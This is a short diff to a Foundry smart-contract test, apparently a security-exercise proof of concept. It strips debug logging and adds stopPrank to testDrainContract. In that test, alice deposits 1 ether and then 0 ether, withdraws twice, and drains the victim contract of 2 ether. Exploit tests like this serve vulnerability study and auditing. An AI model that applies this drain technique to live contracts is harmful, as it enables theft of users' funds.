@@ -21,22 +21,16 @@ contract DeleteUserTest is Test {
     }
 
     function testDrainContract() public {
-        console.log("ADDRESS_ALCIE", alice);
-        console.log("ADDRESS_THIS", address(this));
-        console.log("--------------------------------");
-
         vm.startPrank(alice);
         victimContract.deposit{value: 1 ether}();
         victimContract.deposit{value: 0 ether}();
 
         victimContract.withdraw(1);
         victimContract.withdraw(1);
+        vm.stopPrank();
 
         uint256 balance = address(victimContract).balance;
         uint256 aliceBalance = alice.balance;
-
-        console.log("Balance", balance);
-        console.log("Alice Balance", aliceBalance);
 
         assertEq(address(victimContract).balance, 0);
         assertEq(alice.balance, 2 ether);
